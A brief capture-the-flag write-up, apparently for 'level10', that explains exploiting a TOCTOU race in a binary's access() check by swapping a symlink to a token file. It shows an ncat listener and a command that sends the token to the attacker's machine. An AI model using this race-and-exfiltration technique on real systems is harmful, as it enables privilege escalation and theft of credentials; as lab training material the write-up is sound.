# We have a binary and a token file.
# The binary allows us to send the content of a file over the network.
# Dissasembling the binary, we find the 'access' syscall which does not let us
simply bypass it with a simple symlink. But it is vulnerable to a TICTOU attack
(Timing attack). And the port 6969 with it is connecting to.
# To exploit this, we wrote a script to create a symlink to a file that we have
access to, and then overwrite the symlink to the token file.

# We launch 'ncat -l 6969' on our machine to receive the sent token.
# We then launch our script in /tmp/level10/script.sh (don't forget to chmod +x)
# And finally we need to get the good timing when executing './level10
/tmp/level10/link <our-machine-ip>
# And we receive the password for the flag10 user.
